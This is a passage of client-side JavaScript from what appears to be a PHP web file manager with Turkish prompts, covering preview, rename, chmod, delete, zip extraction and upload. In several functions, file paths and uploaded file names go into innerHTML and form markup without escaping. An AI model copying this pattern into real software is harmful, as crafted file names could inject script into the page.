            } else if (category === 'code' || category === 'text') {
                fetch('?action=get_content&file=' + encodeURIComponent(path))
                    .then(response => response.text())
                    .then(content => {
                        const ext = name.split('.').pop().toLowerCase();
                        const langMap = {
                            'js': 'javascript', 'php': 'php', 'py': 'python',
                            'css': 'css', 'html': 'markup', 'xml': 'markup'
                        };
                        const lang = langMap[ext] || 'markup';
                        body.innerHTML = '<pre class="code-preview text-start"><code class="language-' + lang + '">' + 
                                       Prism.highlight(content, Prism.languages[lang], lang) + '</code></pre>';
                    });
            } else if (category === 'document') {
                body.innerHTML = '<iframe src="?action=view&file=' + encodeURIComponent(path) + '" style="width:100%; height:70vh; border:none;"></iframe>';
            } else {
                body.innerHTML = '<p>Preview not available</p><a href="?action=download&file=' + encodeURIComponent(path) + '" class="btn btn-primary mt-3"><i class="fas fa-download me-2"></i>Download</a>';
            }
        }

        function renameFile(path, currentName) {
            document.getElementById('renamePath').value = path;
            document.getElementById('renameNewName').value = currentName;
            new bootstrap.Modal(document.getElementById('renameModal')).show();
        }

        function chmodFile(path, currentPerms) {
            document.getElementById('chmodPath').value = path;
            document.getElementById('chmodPerms').value = currentPerms;
            new bootstrap.Modal(document.getElementById('chmodModal')).show();
        }

        function deleteFile(path) {
            if (confirm('Silmek istediğinizden emin misiniz?')) {
                const form = document.createElement('form');
                form.method = 'POST';
                form.innerHTML = '<input type="hidden" name="action" value="delete"><input type="hidden" name="path" value="' + path + '">';
                document.body.appendChild(form);
                form.submit();
            }
        }

        function deleteSelected() {
            const files = getSelectedFiles();
            if (files.length === 0) {
                alert('Dosya seçilmedi!');
                return;
            }
            if (confirm('Seçili dosyaları silmek istediğinizden emin misiniz?')) {
                const form = document.createElement('form');
                form.method = 'POST';
                form.innerHTML = '<input type="hidden" name="action" value="delete_multiple">';
                files.forEach(file => {
                    form.innerHTML += '<input type="hidden" name="files[]" value="' + file + '">';
                });
                document.body.appendChild(form);
                form.submit();
            }
        }

        function extractZip(path) {
            if (confirm('Zip dosyasını açmak istiyor musunuz?')) {
                const form = document.createElement('form');
                form.method = 'POST';
                form.innerHTML = '<input type="hidden" name="action" value="extract"><input type="hidden" name="zip_file" value="' + path + '">';
                document.body.appendChild(form);
                form.submit();
            }
        }

        function downloadZip() {
            const files = getSelectedFiles();
            if (files.length === 0) {
                alert('Dosya seçilmedi!');
                return;
            }
            const form = document.createElement('form');
            form.method = 'POST';
            form.innerHTML = '<input type="hidden" name="action" value="download_zip">';
            files.forEach(file => {
                form.innerHTML += '<input type="hidden" name="files[]" value="' + file + '">';
            });
            document.body.appendChild(form);
            form.submit();
        }

        // Bulk operation modals
        ['zip', 'move', 'copy'].forEach(action => {
            document.getElementById(action + 'Modal').addEventListener('show.bs.modal', function() {
                const files = getSelectedFiles();
                if (files.length === 0) {
                    alert('Dosya seçilmedi!');
                    return;
                }
                const container = document.getElementById(action + 'FilesList');
                container.innerHTML = '<div class="alert alert-info"><strong><?php echo $t['selected_files']; ?>:</strong> ' + files.length + ' dosya</div>';
                files.forEach(file => {
                    container.innerHTML += '<input type="hidden" name="files[]" value="' + file + '">';
                });
            });
        });

        // File upload handling
        const uploadZone = document.getElementById('uploadZone');
        const fileInput = document.getElementById('fileInput');
        const fileList = document.getElementById('fileList');
        const uploadBtn = document.getElementById('uploadBtn');

        ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
            uploadZone.addEventListener(eventName, preventDefaults, false);
        });

        function preventDefaults(e) {
            e.preventDefault();
            e.stopPropagation();
        }

        ['dragenter', 'dragover'].forEach(eventName => {
            uploadZone.addEventListener(eventName, () => uploadZone.classList.add('dragover'), false);
        });

        ['dragleave', 'drop'].forEach(eventName => {
            uploadZone.addEventListener(eventName, () => uploadZone.classList.remove('dragover'), false);
        });

        uploadZone.addEventListener('drop', function(e) {
            const dt = e.dataTransfer;
            const files = dt.files;
            fileInput.files = files;
            handleFiles(files);
        });

        function handleFiles(files) {
            if (files.length > 0) {
                fileList.innerHTML = '<div class="alert alert-success"><i class="fas fa-check-circle me-2"></i>' + files.length + ' dosya seçildi</div>';
                let html = '<ul class="list-group">';
                Array.from(files).forEach(file => {
                    html += '<li class="list-group-item d-flex justify-content-between align-items-center">' + 
                            file.name + '<span class="badge bg-primary">' + formatBytes(file.size) + '</span></li>';
                });
                html += '</ul>';
                fileList.innerHTML += html;
                uploadBtn.style.display = 'block';
            }
        }

        function formatBytes(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
        }
    </script>
</body>
</html>
